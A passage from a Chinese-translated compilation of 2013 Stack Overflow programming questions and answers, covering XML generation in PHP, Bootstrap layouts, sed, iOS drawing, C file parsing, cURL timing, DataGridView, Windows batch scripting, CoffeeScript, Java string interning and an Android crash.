更简单！谢谢你们的帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-23T22:59:07.380

创建 XML 的一种简单方法是 XMLWriter：

```
$r=new XMLWriter();
$r->openMemory();
$r->startDocument('1.0','UTF-8');
$r->startElement('kml');
    $r->startElement('document');
    $r->startElement('Placemark');
        $r->startElement('name');
        $r->text($row['icao']);
    $r->endElement();
    $r->startElement('description');
        $r->text($row['name']);
    $r->endElement();
    $r->startElement('Point');
                $r->startElement('coordinates');
                    $r->text($row['lon'].' , '.$row['lat']);
                $r->endElement(); // coordinates
    $r->endElement(); // point          
        $r->endElement(); // Placemark
    $r->endElement(); // document
$r->endElement(); // kml
$newxml = $r->outputMemory(true); 
```

您仍然需要弄清楚如何在 mml-node 中设置命名空间。见[http://www.php.net/manual/en/function.xmlwriter-start-element-ns.php](http://www.php.net/manual/en/function.xmlwriter-start-element-ns.php)

# css - 自定义引导程序 - 如何更改特定宽度下的列数？

> ID：15555780
> 
> 赞同：1
> 
> 时间：2013-03-21T18:51:22.950
> 
> 标签：css, twitter-bootstrap, responsive-design

我开始自定义我的引导程序，到目前为止，我有一些与以下模板非常相似的东西：

[http://twitter.github.com/bootstrap/examples/fluid.html](http://twitter.github.com/bootstrap/examples/fluid.html)

但我有四个 span3，而不是三个 span4。一旦浏览器达到一定的宽度，我想要三个 span3s。然后，在另一个宽度，两个 span3s。

有没有办法用直接的css做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:59:42.373

`.span3`您可以简单地将s的宽度减小为`.span2`媒体查询中的 's 的宽度。

```
/* Bootstrap defaults: */
.span3 {
    width:270px;
}

.span4 {
    width:370px;
}

@media screen and (max-width: 1024px) and (min-width: 767px) {
    /* Decreased span4 size within media query. */
    .span4 {
        width:270px;
    }
    ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-06T15:00:21.103

这是一种使用 jQuery / javascript 的方法。“.colElement”是您想要影响的每个 .span* 元素。只需调整窗口宽度断点以满足您的需求。

基于 twitter 引导程序 2.*

```
function arrangeColumns(tile, numColsLG, numColsMED, numColsSM){
    $(tile).removeClass('first');
    var colSize = 0;
    var windowWidth = $(window).width();
    switch(numColsLG) {
        case 2: colSizeLG = 6; break;
        case 3: colSizeLG = 4; break;
        case 4: colSizeLG = 3; break;
        case 5: colSizeLG = 3; break;
        case 6: colSizeLG = 2; break;
    }
    switch(numColsMED) {
        case 2: colSizeMED = 6; break;
        case 3: colSizeMED = 4; break;
        case 4: colSizeMED = 3; break;
        case 5: colSizeMED = 3; break;
        case 6: colSizeMED = 2; break;
    }
    switch(numColsSM) {
        case 2: colSizeSM = 6; break;
        case 3: colSizeSM = 4; break;
        case 4: colSizeSM = 3; break;
        case 5: colSizeSM = 3; break;
        case 6: colSizeSM = 2; break;
    }

    if( windowWidth > 1200){
        $(tile).removeClass('span' + colSizeMED + " " + 'span' + colSizeSM);
        $(tile).addClass('span' + colSizeLG);
        $(tile + ':nth-child('+numColsLG+'n+1)').addClass('first');     
    } else if( windowWidth < 1200 && windowWidth > 900) {
        $(tile).removeClass('span' + colSizeLG + " " + 'span' + colSizeSM);
        $(tile).addClass('span' + colSizeMED);
        $(tile + ':nth-child('+numColsMED+'n+1)').addClass('first');        
    } else {
        $(tile).removeClass('span' + colSizeLG + " " + 'span' + colSizeMED);
        $(tile).addClass('span' + colSizeSM);
        $(tile + ':nth-child('+numColsSM+'n+1)').addClass('first');     
    }
}       

/* Initialize */
arrangeColumns('.colElement', 3, 2, 2);
/* Call on window resize  */
$(window).resize(function() {
    arrangeColumns('.colElement', 3, 2, 2);
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-01-14T16:58:01.730

我最近需要这个作为我的原型。我可以想到三个肮脏的解决方案，它们都不是真正完美的，足以让我在生产代码中实现。但是，如果您需要它用于简单的静态网站或使用原型演示某些东西，它们都可以正常工作。

1.  编写两个场景。一个有 4 列，另一个有 3 列。使用@media 查询隐藏/显示所需的一项。（使用引导程序中的实用程序类）。

2.  类似于没有。1 但不那么凌乱。而不是编写两个不同的场景 - 动态更改 HTML 标记。放置一个简单的 JS/Jquery 脚本，它将删除一些类并在特定宽度上添加新的类。您可能需要销毁一些 [div class="row"] 并动态创建新的，以连续获得不同数量的项目。

3.  忽略此部分的网格（如果可以）并硬编码您的项目。您可以修复它们的宽度，因此当空间不足时，它们将开始换行，或者仅使用百分比和硬编码特定宽度与 @media 查询。您始终可以使用所有列并将硬编码的项目放在一行中（例如，使用所有 12 列作为容器）。

4.  奖励 - 使用同位素 ( [http://mpezzi.github.io/bootstrap_isotope/](http://mpezzi.github.io/bootstrap_isotope/) ) 或 Mansonry [http://masonry.desandro.com/](http://masonry.desandro.com/)来实现你的效果。

如果能够控制我想显示的特定断点处连续有多少项目，那就太好了，但这需要重新考虑引导程序......也许他们会弄清楚并添加为附加组件或其他东西.. . 目前我什至无法想到这如何与引导默认类一起工作......

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-10-27T00:57:43.873

我了解您要求使用 Bootsrap，但 Zurb Foundation 具有这样的内置功能

```
<div class="row">
  <div class="small-4 medium-6 large-12 columns">
  </div>
  <div class="small-8 medium-6 columns">
  </div>
</div> 
```

这样做是为小型设备创建 2 列 4 和 8 列，或为中型设备创建 2 列 6 列，在大屏幕上创建 1 个 12 列全宽列。如果您想在屏幕尺寸上保持相同的布局，只需 small-* 列，它将用于中型和大型媒体查询

# linux - sed：在某个位置插入一行

> ID：15555781
> 
> 赞同：0
> 
> 时间：2013-03-21T18:51:24.967
> 
> 标签：linux, bash, sed

我只是环顾四周，但没有找到任何适合我的东西。我想在其他行的顶部插入一个新行（基本上是一个 html 表格行）。

```
<table id="tfhover" class="tftable" border="1">
<tr><th>HEADER1</th><th>HEADER2</th><th>HEADER3</th><th>HEADER4</th></tr>
<tr><td>Row:1 Cell:1</td><td>Row:1 Cell:2</td><td>Row:1 Cell:3</td><td>Row:1 Cell:4</td></tr>
</table> 
```

那么，有没有人可以建议我一个 sed cmd 来插入一个新的：

```
<tr><td>Row:1 Cell:1</td><td>Row:1 Cell:2</td><td>Row:1 Cell:3</td><td>Row:1 Cell:4</td> 
```

就在标题下方？

谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-26T23:51:45.247

因此，首先，我们有一个包含以下行的文件，称为`datafile.txt`

```
1 some test lines here
but not all lines contain nubers
3 and here is the last one 
```

我们有一个 bash 变量`$ADDED`，其中包含要添加的行内容

```
ADDED="==This is the new line==" 
```

## 所以，在第一行之后添加一行

```
ADDED="==This is the new line=="
< datafile.txt sed "1a \\
$ADDED
" 
```

结果：

```
1 some test lines here
==This is the new line==
but not all lines contain nubers
3 and here is the last line 
```

## 在所有以数字开头的行之后添加行

```
< datafile.txt sed "/^[0-9]/a \\
$ADDED
" 
```

结果：

```
1 some test lines here
==This is the new line==
but not all lines contain nubers
3 and here is the last line
==This is the new line== 
```

## 将行添加到开头，因此在第一行之前插入

```
< datafile.txt sed "1i \\
$ADDED
" 
```

结果

```
==This is the new line==
1 some test lines here
but not all lines contain nubers
3 and here is the last line 
```

## 您可以“替换”行尾以添加新行

```
< datafile.txt sed "/all/s/$/\\
$ADDED/" 
```

上面的示例通过替换在包含单词“all”的行之后添加行

```
1 some test lines here
but not all lines contain nubers
==This is the new line==
3 and here is the last line 
```

## 您甚至可以分割线并添加

```
< datafile.txt sed "/all/s/\(.*lines \)\(.*\)/\1\\
$ADDED\\
\2/" 
```

以上将搜索包含单词“all”的行并将其拆分在单词“lines”之后。结果：

```
1 some test lines here
but not all lines 
==This is the new line==
contain nubers
3 and here is the last line 
```

最后一件事。**用正则表达式解析**HTML是不可能的，请检查 sputnik 评论中的链接。

但是，这并不意味着不可能**匹配**HTML 文件的某些部分。如果您知道要**匹配**（而不是解析）的内容 - 您也可以安全地对 HTML 使用正则表达式。简单来说，这里很多人不知道解析和匹配的区别。

因此，如果您的 html 文件具有众所周知的结构，例如，您*确定*您的 html 将始终采用上述结构，您可以安全地编写：

```
<your_file.html sed "/^<tr><th>/a \\
<tr><td>new Row:1 Cell:1</td><td>Row:1 Cell:2</td><td>Row:1 Cell:3</td><td>Row:1 Cell:4</td>
" 
```

你会得到

```
<table id="tfhover" class="tftable" border="1">
<tr><th>HEADER1</th><th>HEADER2</th><th>HEADER3</th><th>HEADER4</th></tr>
<tr><td>new Row:1 Cell:1</td><td>Row:1 Cell:2</td><td>Row:1 Cell:3</td><td>Row:1 Cell:4</td>
<tr><td>Row:1 Cell:1</td><td>Row:1 Cell:2</td><td>Row:1 Cell:3</td><td>Row:1 Cell:4</td></tr>
</table> 
```

仅仅因为我们*没有解析*html 代码，我们只*匹配*了一些行模式..

# ios - 在表格视图单元格中显示“加载栏”

> ID：15555782
> 
> 赞同：0
> 
> 时间：2013-03-21T18:51:29.507
> 
> 标签：ios, objective-c, xcode, uitableview

我已经四处寻找如何做到这一点，但除了创建自己的表格视图单元格的基础知识之外，我不知道如何做到这一点。我试图做的事情很难描述，所以我制作了这张图片来尝试解释：

![图片](../Images/57f6c839b6b46b6e1d3479e1013b481d.png)

所以这个程序基本上做的是它播放歌曲，可能同时，在等待之后。这整个等待+歌曲在我的程序中被称为提示。每个提示都有自己的表格视图单元格，它显示了它已经播放了多少。这是我正在努力的部分。我能想到的显示播放量的最佳方式就像在照片中一样，蓝色代表歌曲播放了多少，绿色代表播放了多少等待时间，整个东西代表了多少的提示已经播放。**我不知道如何制作一个表格视图单元格，我可以在其中制作一个带有可变数量的绿色/蓝色区域的动画条（b/c 歌曲正在播放）。任何人都可以帮忙吗？**

如果其中任何一个不清楚或令人困惑，请发表评论，以便我澄清。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T20:13:40.343

您可以将`backgroundView`单元格的属性设置为 UIView 的自定义子类，该子类具有`drawRect`类似于以下的方法：

```
- (void)drawRect:(CGRect)rect {
    CGContextRef context = UIGraphicsGetCurrentContext();
    CGContextSetRGBFillColor(context, 1.0, 1.0, 1.0, 1.0);
    CGContextFillRect(context, rect);
    CGRect blueRect = CGRectMake(0, 0, self.bluePercentage/100.0*rect.size.width, rect.size.height);
    CGContextSetRGBFillColor(context, 0.0, 0.0, 1.0, 1.0);
    CGContextFillRect(context, blueRect);
    CGRect greenRect = CGRectMake(0, 0, self.greenPercentage/100.0*rect.size.width, rect.size.height);
    CGContextSetRGBFillColor(context, 0.0, 1.0, 0.0, 1.0);
    CGContextFillRect(context, greenRect);
} 
```

你明白了：首先填充白色（默认背景为黑色），在其上绘制蓝色条，在蓝色条上绘制绿色条。`bluePercentage`并且`redPercentage`是您必须自己设置的属性。

此外，每次更新进度时，您都必须调用`[cell setNeedsDisplay]`以告诉单元格重新绘制进度条。

# c - 如何在c中使用文件中的信息

> ID：15555783
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:51:35.817
> 
> 标签：c

所以我们正在尝试创建一个计算来比较用户给我们的电影评分。我们已将其分成不同的团队用于我们的课程项目。我的任务是创建从不同团队的文件输出中读取的计算，然后使用我提出的计算创建输出。从文件中读取很好，但是我无法弄清楚如何使用该信息进行计算。

这是我的问题领域：

```
 long int similarity;
#define MAXLINESIZE 80
FILE* myTextFile;
char ch;
char lineBuf[MAXLINESIZE] = { '\0' };
char *person [10] = { '\0' };
char *movie [10] = { '\0' };
char *rating [10] = { '\0' };

myTextFile = fopen("C:\\users\\owner\\desktop\\movieRating.txt", "r");

if(myTextFile == NULL){
    printf("Failed");
}

fgets (lineBuf, MAXLINESIZE - 1, myTextFile);

while ( !feof (myTextFile) && !ferror (myTextFile) ) {
    sscanf ( lineBuf, "%s %s %s", person, movie, rating);
    printf("\n person = %s \n movie = %s \n rating = %s \n", person,movie,rating);
    fgets (lineBuf, MAXLINESIZE - 1, myTextFile);

}
long int per = atoi(person[10]);
long int mov = atoi(movie[10]);
long int rat = atoi(rating[10]);
{
similarity = (per + rat) * (per + rat);
return (similarity);
printf("\n Similarity is %i\n", similarity);
getchar ();
}

getchar();
getchar ();
return 0;

} 
```

希望我已经正确解释了这一点

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:58:41.340

**如果您的*问题区域*在这里：**

```
char *person [10] = { '\0' };
char *movie [10] = { '\0' };
char *rating [10] = { '\0' }; 
```

应该改成这样：

```
char person [10] = { '\0' };
char movie [10] = { '\0' };
char rating [10] = { '\0' }; 
```

你想要一个字符数组。不是指针数组。

**如果您的问题区域在这里：**

```
long int per = atoi(person[10]);
long int mov = atoi(movie[10]);
long int rat = atoi(rating[10]); 
```

应该改成这样：

```
long int per = atoi(person);
long int mov = atoi(movie);
long int rat = atoi(rating); 
```

`person`是（现在）一个字符数组 - 这是`atoi`预期的。

`person[10]`是（现在）一个字符，从数组的末尾非法读取。

**如果您的问题区域在这里：**

```
return (similarity);
printf("\n Similarity is %i\n", similarity); 
```

应该改成这样：

```
printf("\n Similarity is %i\n", similarity);
return (similarity); 
```

在`return`.

# php - 通过浏览器直接获取比 cURL 快约 2 倍

> ID：15555785
> 
> 赞同：1
> 
> 时间：2013-03-21T18:51:40.840
> 
> 标签：php, curl

我有一个网络摄像头，我正试图将其设置为公开。网络摄像头是公开可用的，但每次观看人数翻倍时，刷新延迟也会增加。因此，我只是要建立一个简单的转播网站，它不会牺牲质量或需要付费的 3rd 方支持来处理事情。

目前，直接连接到相机时获取图像的延迟为 700 毫秒。这是通过 chrome 调试器验证的。如果我编写一个 cURL 下载请求，根据 curl_getinfo 的延迟平均为 1.4 秒。使用 file_put_contents() 具有相同的持续时间。

```
$ch = curl_init('http://path.to/image.jpg');
$fp = fopen('./localImage.jpg', 'wb');
curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($ch);
$ci = curl_getinfo($ch);
curl_close($ch);
var_dump($ci);
fclose($fp); 
```

知道为什么会这样吗？

```
array(22) {
  ["url"]=>
  string(33) "http://path.to/image.jpg"
  ["content_type"]=>
  string(10) "image/jpeg"
  ["http_code"]=>
  int(200)
  ["header_size"]=>
  int(124)
  ["request_size"]=>
  int(64)
  ["filetime"]=>
  int(-1)
  ["ssl_verify_result"]=>
  int(0)
  ["redirect_count"]=>
  int(0)
  ["total_time"]=>
  float(1.40834)
  ["namelookup_time"]=>
  float(4.7E-5)
  ["connect_time"]=>
  float(0.082317)
  ["pretransfer_time"]=>
  float(0.083356)
  ["size_upload"]=>
  float(0)
  ["size_download"]=>
  float(60331)
  ["speed_download"]=>
  float(42838)
  ["speed_upload"]=>
  float(0)
  ["download_content_length"]=>
  float(60331)
  ["upload_content_length"]=>
  float(0)
  ["starttransfer_time"]=>
  float(0.318247)
  ["redirect_time"]=>
  float(0)
  ["certinfo"]=>
  array(0) {
  }
  ["redirect_url"]=>
  string(0) ""
} 
```

# vb.net - DataGridView 选择行

> ID：15555788
> 
> 赞同：1
> 
> 时间：2013-03-21T18:51:47.283
> 
> 标签：vb.net, datagridview, right-click, contextmenustrip

我想通过右键单击在我的 DataGridView 中选择一行。但是使用我当前的代码，我首先必须通过常规的鼠标左键单击该行。

有什么方法可以通过右键单击选择当前行然后打开 ContextMenuStrip？

```
Private Sub DataGridView1_CellMouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.DataGridViewCellMouseEventArgs) Handles DataGridView1.CellMouseDown
    If e.Button = Windows.Forms.MouseButtons.Right AndAlso e.RowIndex >= 0 Then
        Me.DataGridView1.CurrentCell = Me.DataGridView1.Rows(e.RowIndex).Cells(e.ColumnIndex)

    End If
End Sub

Private Sub datagridview1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles DataGridView1.MouseDown
    If e.Button = Windows.Forms.MouseButtons.Right Then
        Dim hti As DataGridView.HitTestInfo = sender.HitTest(e.X, e.Y)
        If hti.Type = DataGridViewHitTestType.Cell Then
            If Not DataGridView1.Rows(hti.RowIndex).Selected Then
                DataGridView1.ClearSelection()
                DataGridView1.Rows(hti.RowIndex).Selected = True
            End If
        End If
    End If
End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T00:30:45.167

试试这个：

```
 Private Sub DataGrid1_CellMouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs)

    On Error Resume Next

    If e.Button = MouseButtons.Right Then

        'Clear previous selections
        For x As int32 = 0 To ds.Tables(0).Rows.Count() - 1
            DataGrid1.UnSelect(x)
        Next x

        'select row under mouse click
        Dim info As DataGrid.HitTestInfo = DataGrid1.HitTest(e.X, e.Y)

        If info.Row > -1 Then

            DataGrid1.CurrentRowIndex = info.Row
            DataGrid1.Select(info.Row)

            Application.DoEvents()

            DataGridContextMenu.Show(Cursor.Position)

        End If

        info = Nothing

    End If

End Sub 
```

# variables - 在目录树中使用随机生成的文件夹名称？

> ID：15555795
> 
> 赞同：1
> 
> 时间：2013-03-21T18:52:20.890
> 
> 标签：variables, random, batch-file, directory

我正在尝试制作一个批处理文件来备份和恢复我最喜欢的在线游戏的 cookie，但在尝试浏览 Chrome 用来存放其 cookie 的随机命名文件夹时遇到了问题。

我尝试使用该`FOR`命令获取一个变量，该变量将为我提供文件夹的名称，然后我稍后将在目录中使用该变量。该变量在`ECHO`'d 时工作正常，但`%G`在放入目录时变为。

起初我输入了我的代码，但它是一个丑陋的文本块，所以这里只是一个示例：

```
FOR /F "tokens=*" %%G IN ('dir /B /AD "%SYSTEMDRIVE%\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Pepper Data\Shockwave Flash\WritableRoot\#SharedObjects"') DO (
echo %%G ) 
```

这返回了正确文件夹名称的回声 :)

但是当我`%%G`在目录中使用时：

```
copy "%SYSTEMDRIVE%\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Pepper Data\Shockwave Flash\WritableRoot\#SharedObjects\%%G\chat.kongregate.com\antiIdle_file0" "%HOMEPATH%\My Documents\Anti-Idle backup\antiIdle_file0.sol" /D /E /C /R /I /K /Y 
```

当在变量前面使用 ECHO 测试变量时，`%%G`显示为`%G`而不是应显示为的随机数字字符串。

如果我做错了什么，请批评我。如果您有建议或替代方法来处理此问题，请告诉我。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T19:10:31.810

`%%G`仅在上下文中有效，`FOR`因此您需要`COPY`在括号后的括号中包含您的命令`DO`

```
FOR /F "tokens=*" %%G IN (
'dir ...blahblahblah...SharedObjects"') DO (
echo %%G
copy "%SYSTEMDRIVE%\...blah..SharedObjects\%%G\...zzzz...file0" "%HOMEPATH%...etc.._file0.sol" /D /E /C /R /I /K /Y
) 
```

显然，`echo %%G`是可选的。（可以将命令分成单独的行 - 小心。开括号与 DO 在同一行至关重要）

另一种方法是

```
FOR /F "tokens=*" %%G IN (
 'dir ...blahblahblah...SharedObjects"') DO set "target=%%G"
copy "%SYSTEMDRIVE%\...blah..SharedObjects\%TARGET%\...zzzz...file0" "%HOMEPATH%...etc.._file0.sol" /D /E /C /R /I /K /Y 
```

注意 metavariable( `%%G`) 的 CASE 很关键，但它的名称和大小写`TARGET`不是。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:26:14.347

您还可以对`chat.kongregate.com`.

```
for /f "delims=" %%I in ('dir /s /b /a:d "%LOCALAPPDATA%\Google\Chrome\*chat.kongregate.com"') do (
    copy /d /y "%%I\antiIdle_file0" "%USERPROFILE%\My Documents\Anti-Idle backup\antiIdle_file0.sol"
) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T19:30:45.767

如果您想在代码的一部分中找到该文件夹​​并在其他地方使用它，您可以使用`for`循环设置另一个变量，并在以后使用另一个变量进行复制。

```
FOR /F "tokens=*" %%G IN ('dir /B /AD "...your path..."') DO (
    SET FolderPath=%%G
) 
```

...和其他地方：

```
COPY "...source file..." "%FolderPath%" 
```

# coffeescript - 咖啡脚本语法问题

> ID：15555800
> 
> 赞同：0
> 
> 时间：2013-03-21T18:52:37.957
> 
> 标签：coffeescript

这个咖啡脚本有什么问题吗？它在这个小提琴上工作正常

[http://jsfiddle.net/Dtwigs/ThnKc/2/](http://jsfiddle.net/Dtwigs/ThnKc/2/)

但是当我尝试将其转换为咖啡脚本时，它似乎不想工作

```
$(document).on "change", "#print_size_options_LargeFormatBlackWhite", (event) ->
  selected = undefined
  index = undefined
  selected = $(this).val()
  index = $("select").index(this)
  if selected is "customSize"
    $($(".custom_size")[index]).fadeIn()
  else
    $($(".custom_size")[index]).fadeOut() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:49:20.617

你的小提琴有一些问题。

1.  您对多个元素使用相同的 ID - 您应该将其设为一个类。

2.  您正在将更改事件添加到文档中，最好将其添加到更精确的选择器中，即选择。

3.  如果您首先要使用 JS 编写它，那么使用 CoffeeScript 转换器并没有太大的好处。

我已经修复了小提琴的一些问题并在[此处](http://jsfiddle.net/phenomnomnominal/ThnKc/5/)进行了更新。

新的 CoffeeScript 如下所示：

```
$(".print_size_options_LargeFormatBlackWhite").change ->
  selected = $(this).val()
  index = $("select").index this
  func = if selected is ".custom_size" then 'fadeIn' else 'fadeOut'
  $($('.custom_size')[index])[func]() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:05:39.087

我能看到的唯一区别是你在小提琴上写（事件）是（evt）。

您是否正在考虑使用[http://js2coffee.org/](http://js2coffee.org/)进行转换？

# java - string.intern 没有使用更少的内存

> ID：15555801
> 
> 赞同：3
> 
> 时间：2013-03-21T18:52:40.013
> 
> 标签：java, string, memory

我存储了大量相等的字符串。价值观不会经常改变。

由于`string.intern()`应该只返回引用，因此我将 1 亿个完全相同的字符串列表中的每一个都进行了实习，这些字符串存储在`ArrayList`.

我预计 Java 内存会大幅下降，但存储普通字符串与存储字符串显示的差异小于 0.1%。

我错过了什么还是这是预期的行为？

列表生成代码

```
 long max = 100000000;
    for(int i =0 ; i < max;i++ ){
        list.add("sometextelidedforbrevity".intern());
    } 
```

内存使用量为 1 242 360 KB 和 1 242 184 KB。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-21T19:07:12.720

字符串文字会自动被实习。也就是说，表达式`"sometextelidedforbrevity"`将始终在运行时成为`String`已被实习的对象引用。调用`intern()`一个已经实习过的字符串实际上是一个空操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:07:03.967

我使用的是字符串文字，我在文档中忽略了它，感谢 cdhowie 和 Russel Zahniser 在评论中的回答。

他们*已经*通过使用文字被拘留。

据我了解，让字符串不被实习的唯一方法是使用 new String()。

# java - java.lang.NullPointerException

> ID：15555805
> 
> 赞同：0
> 
> 时间：2013-03-21T18:52:52.470
> 
> 标签：java, android, runtime-error, onclicklistener

我在调试我的应用程序时收到错误消息。

```
03-21 20:44:33.027: E/AndroidRuntime(4773): FATAL EXCEPTION: main
03-21 20:44:33.027: E/AndroidRuntime(4773): java.lang.RuntimeException: Unable to start  activity ComponentInfo{nt.finger.paint/nt.finger.paint.FingerPaint}: java.lang.NullPointerException
03-21 20:44:33.027: E/AndroidRuntime(4773): Caused by: java.lang.NullPointerException
03-21 20:44:33.027: E/AndroidRuntime(4773):     at nt.finger.paint.FingerPaint.onCreate(FingerPaint.java:67) 
```

我必须做什么？

在这里，您有我的第一个活动的 FingerPaint.java 的完整代码。ImageViewLine 在 R.id 中注册，我只有一个名为 main.xml 的 XML 文件，并且我有所有图像。

```
public class FingerPaint extends Activity {
Paint mPaint;
private static final String TAG = "FingerPaint";
DrawView drawView;
ImageView imageViewLine;
ImageView imageViewRectangle;
static LinearLayout ll;

private final int CONTEXT_MENU_LINES_ID = 1;
private final int CONTEXT_MENU_SHAPES_ID = 2;
private final int CONTEXT_MENU_COLOR_ID = 3;

private IconContextMenu iconContextMenuLine = null;
private IconContextMenu iconContextMenuShapes = null;
private IconContextMenu iconContextMenuColors = null;

private final int MENU_ITEM_1_ACTION = 1;
private final int MENU_ITEM_2_ACTION = 2;
private final int MENU_ITEM_3_ACTION = 3;
private final int MENU_ITEM_4_ACTION = 4;

private ImageView imageViewText;

private ImageView imageViewColor;

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    initContextMenus();

    drawView = (DrawView)this.findViewById(R.id.DrawView);

    ll = (LinearLayout) this.findViewById(R.id.linearLayout2);

    imageViewLine = (ImageView)this.findViewById(R.id.imageViewLine);
    imageViewLine.setOnClickListener(new OnClickListener() { //there is error

        @SuppressWarnings("deprecation")
        public void onClick(View v) {
            Toast.makeText(getApplicationContext(), "Line tool clicked", Toast.LENGTH_SHORT).show();
            //myView.setMode(1); //draw line
            //myView.setOnTouchListener(myView.drawLineListener);
            showDialog(CONTEXT_MENU_LINES_ID,null);
        }
    });

    imageViewRectangle = (ImageView)this.findViewById(R.id.imageViewSquare);
    imageViewRectangle.setOnTouchListener(new OnTouchListener() {

        @SuppressWarnings("deprecation")
        public boolean onTouch(View v, MotionEvent event) {
            if(event.getAction() == MotionEvent.ACTION_DOWN)
            {
                //Toast.makeText(getApplicationContext(), "Rectangle tool clicked", Toast.LENGTH_SHORT).show();
                //myView.setMode(5); //draw rectangle
                showDialog(CONTEXT_MENU_SHAPES_ID,null);
                return true;
            }
            return false;
        }
    });

    imageViewText = (ImageView)this.findViewById(R.id.imageViewText);
    imageViewText.setOnClickListener(new OnClickListener() {

        public void onClick(View v) {
            drawView.setMode(6);//text input
        }
    });

    imageViewColor = (ImageView)this.findViewById(R.id.imageViewColor);
    imageViewColor.setOnClickListener(new OnClickListener() {

        @SuppressWarnings("deprecation")
        public void onClick(View v) {
            Toast.makeText(getApplicationContext(), "Select color", Toast.LENGTH_SHORT).show();
            //myView.setMode(5); //draw rectangle
            showDialog(CONTEXT_MENU_COLOR_ID,null);

        }
    });
}

protected Dialog onCreateDialog(int id) {
    if (id == CONTEXT_MENU_LINES_ID) {
        return iconContextMenuLine.createMenu("Lines");
    }
    else if(id == CONTEXT_MENU_SHAPES_ID){
        return iconContextMenuShapes.createMenu("Shapes");
    }
    else if(id == CONTEXT_MENU_COLOR_ID){
        return iconContextMenuColors.createMenu("Choose color");
    }
    return super.onCreateDialog(id);
}

    public  void initContextMenus(){
        Resources res = getResources();
        //init icon context menu
        iconContextMenuLine = new IconContextMenu(this, CONTEXT_MENU_LINES_ID);
        iconContextMenuLine.addItem(res, "", R.drawable.line, MENU_ITEM_2_ACTION);
        iconContextMenuLine.addItem(res, "", R.drawable.linie_taiata, MENU_ITEM_4_ACTION);

        iconContextMenuLine.setOnClickListener(new IconContextMenu.IconContextMenuOnClickListener() {
            public void onClick(int menuId) {
                switch(menuId) {

                case MENU_ITEM_2_ACTION:
                    //Toast.makeText(getApplicationContext(), "You've clicked on menu item 2", Toast.LENGTH_SHORT).show();
                    drawView.normal_line();
                    drawView.setMode(1); //draw line
                    break;
                case MENU_ITEM_4_ACTION:
                    //Toast.makeText(getApplicationContext(), "You've clicked on menu item 2", Toast.LENGTH_SHORT).show();
                    drawView.dash_line();
                    drawView.setMode(1);//draw  dashed line
                    break;

                }
            }
        });

        iconContextMenuShapes = new IconContextMenu(this, CONTEXT_MENU_SHAPES_ID);
        iconContextMenuShapes.addItem(res, "", R.drawable.cerc,MENU_ITEM_1_ACTION);
        iconContextMenuShapes.addItem(res, "",R.drawable.square, MENU_ITEM_2_ACTION);

        iconContextMenuShapes.setOnClickListener(new IconContextMenu.IconContextMenuOnClickListener() {
            public void onClick(int menuId) {

                switch(menuId) {

                case MENU_ITEM_1_ACTION:
                    //Toast.makeText(getApplicationContext(), "You've clicked on menu item 2", Toast.LENGTH_SHORT).show();
                    drawView.setMode(4); //draw circle
                    break;
                case MENU_ITEM_2_ACTION:
                    //Toast.makeText(getApplicationContext(), "You've clicked on menu item 2", Toast.LENGTH_SHORT).show();
                    drawView.setMode(5); //draw  rectangle
                    break;

                }
            }
        });

        iconContextMenuColors = new IconContextMenu(this, CONTEXT_MENU_SHAPES_ID);
        iconContextMenuColors.addItem(res, "", R.drawable.red,MENU_ITEM_1_ACTION);
        iconContextMenuColors.addItem(res, "",R.drawable.green, MENU_ITEM_2_ACTION);
        iconContextMenuColors.addItem(res, "",R.drawable.blue, MENU_ITEM_3_ACTION);

        iconContextMenuColors.setOnClickListener(new IconContextMenu.IconContextMenuOnClickListener() {
            public void onClick(int menuId) {

                switch(menuId) {

                case MENU_ITEM_1_ACTION:
                    Toast.makeText(getApplicationContext(), "Red", Toast.LENGTH_SHORT).show();
                    drawView.changeColour(Color.RED);

                    break;
                case MENU_ITEM_2_ACTION:
                    Toast.makeText(getApplicationContext(), "Green", Toast.LENGTH_SHORT).show();
                    drawView.changeColour(Color.GREEN);
                    break;

                case MENU_ITEM_3_ACTION:
                    Toast.makeText(getApplicationContext(), "Blue", Toast.LENGTH_SHORT).show();
                    drawView.changeColour(Color.BLUE);

                    break;

                }
            }
        });

    // Set full screen view

    // lock screen orientation (stops screen clearing when rotating phone)
    setRequestedOrientation(getResources().getConfiguration().orientation);

    drawView = new DrawView(this, null);
    setContentView(drawView);
    drawView.setBackgroundColor(Color.WHITE);
    drawView.requestFocus();
}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    MenuInflater inflater = getMenuInflater();
    inflater.inflate(R.menu.paint_menu, menu);
    return true;
}

@Override
public boolean onOptionsItemSelected(MenuItem item) {
    // Handle item selection
    switch (item.getItemId()) {
    case R.id.clear_id : {
        drawView.clearPoints();
        return true;
    }
    case R.id.p_white_id : {
        drawView.changeColour(0);
        return true;
    }
    case R.id.w_small : {
        drawView.changeWidth(5);
        return true;
    }
    case R.id.w_medium : {
